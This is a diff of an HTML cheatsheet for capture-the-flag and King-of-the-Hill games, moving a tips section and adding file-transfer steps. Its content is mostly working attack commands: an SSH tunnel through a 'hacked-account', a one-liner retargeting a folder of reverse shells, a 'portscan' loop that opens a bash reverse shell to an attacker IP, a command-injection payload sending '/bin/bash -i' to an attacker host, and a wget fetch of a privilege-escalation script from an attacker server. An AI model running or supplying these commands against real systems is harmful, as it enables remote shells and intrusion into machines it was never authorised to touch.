@@ -1,48 +1,6 @@
 <h1>PFORM - CTF / KOTH - Cheatsheet</h1><br><br>
 
-<h2>Some random Tips and Tricks</h2>
-
-<h2>SSH Tunneling</h2>
-
-Tunnel traffic over ssh to your attacker machine so you can act as the machine you have ssh in to.
-
-Example.
-
-The victim box have access to a Jenkins server running on ip 172.17.0.2 port:8080.
-
-<b>pform@attacker~: </b><code>ssh -L 4444:172.17.0.2:8080 hacked-account@10.10.20.20</code>
-
-Now you just open your webbrowser and surf to: <code>http://localhost:4444/</code>
-
-And you can access the server running Jenkins as it was on your localnetwork.
-
-<br>
-
-<h2>Change IP on all scripts in a folder</h2>
-
-If you like me have a folders with reverse-shells and scripts for your CTF / Koth needs,
-
-and your IP changes just before the game starts, and no script have the correct ip.
-
-<b>pform@attacker~: </b><code>cd ~/super-ninja-scripts/</code>
-
-<b>pform@attacker~script-folder/:<code>grep -rl 10.10.10.10 * | xargs sed -i 's/10.10.10.10/20.20.20.20/g'</code>
-
-<b>In this example 10.10.10.10 is the old-ip and 20.20.20.20 is the new-ip.</b>
-
-<h2>Use Bash for portscan</h2>
-
-<b>(Use bash to portscan new host thats only accesible from victim machine, with no other portscanner in reach.)</b>
-
-<b>Open ports gives you back a "Done"</b>
-
-<b>Closed ports give you back a "Connection refused"</b>
-
-<b>hacked-account@victim ~/: <code>for i in 79 80 81; do echo $i & bash -i >& /dev/tcp/10.10.20.20/$i 0>&1;done</code>
-
-<br><br>
-
-<h2>RECON</h2> 
+<br><h2>RECON</h2> 
 
 <b>pform@attacker~: </b><code>rustscan -A 10.10.20.20</code>
 
@@ -457,5 +415,56 @@ open upp burp and run command in the bottom of the page:
 <code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>
 
 
+<h2>Some random Tips and Tricks</h2>
 
+<h2>SSH Tunneling</h2>
 
+Tunnel traffic over ssh to your attacker machine so you can act as the machine you have ssh in to.
+
+Example.
+
+The victim box have access to a Jenkins server running on ip 172.17.0.2 port:8080.
+
+<b>pform@attacker~: </b><code>ssh -L 4444:172.17.0.2:8080 hacked-account@10.10.20.20</code>
+
+Now you just open your webbrowser and surf to: <code>http://localhost:4444/</code>
+
+And you can access the server running Jenkins as it was on your localnetwork.
+
+<br>
+
+<h2>Change IP on all scripts in a folder</h2>
+
+If you like me have a folders with reverse-shells and scripts for your CTF / Koth needs,
+
+and your IP changes just before the game starts, and no script have the correct ip.
+
+<b>pform@attacker~: </b><code>cd ~/super-ninja-scripts/</code>
+
+<b>pform@attacker~script-folder/:<code>grep -rl 10.10.10.10 * | xargs sed -i 's/10.10.10.10/20.20.20.20/g'</code>
+
+<b>In this example 10.10.10.10 is the old-ip and 20.20.20.20 is the new-ip.</b>
+
+<h2>Use Bash for portscan</h2>
+
+<b>(Use bash to portscan new host thats only accesible from victim machine, with no other portscanner in reach.)</b>
+
+<b>Open ports gives you back a "Done"</b>
+
+<b>Closed ports give you back a "Connection refused"</b>
+
+<b>hacked-account@victim ~/: <b/><code>for i in 79 80 81; do echo $i & bash -i >& /dev/tcp/10.10.20.20/$i 0>&1;done</code>
+
+<br><b>
+
+<h1>Transfer files</h1>
+
+Run this in the folder you have the files you want to upload.
+
+<b>pform@attacker~: </b>python -m SimpleHTTPServer 5555
+
+<b>pform@attacker~: </b>python3 -m http.server 5555
+
+The use wget to download the file like this:
+
+<b>hacked-account@victim~: </b><code>wget 10.10.10.10:5555/super-privesc-0day.sh .</code>
